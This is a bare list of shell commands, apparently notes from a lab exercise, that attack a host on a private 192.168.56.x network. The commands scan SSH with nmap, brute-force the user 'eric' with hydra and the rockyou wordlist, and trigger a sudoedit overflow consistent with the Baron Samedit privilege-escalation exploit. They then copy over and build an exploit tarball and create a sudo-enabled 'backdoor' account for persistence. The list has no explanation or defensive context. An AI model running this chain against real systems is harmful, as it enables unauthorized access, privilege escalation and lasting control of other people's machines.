sudo nmap -sS -p22 192.168.56.0-20
sudo nmap -sV -O -p22 192.168.56.10

#cd /usr/share/wordlists

sudo gzip -d -k /usr/share/wordlists/rockyou.txt.gz
hydra -l eric -P /usr/share/wordlists/rockyou.txt 192.168.56.10 ssh
ssh eric@192.168.56.10
password
sudoedit -s '\' `perl -e 'print "A" x 65536'`

sudo -V
hostnamectl

cd /blah/blah
make

# rm ~/.ssh/known_hosts
scp exploit.final.tar eric@192.168.56.10:/home/eric/

sudo apt install build-essential
sudo apt install gcc

sudo adduser backdoor
sudo usermod -aG sudo backdoor

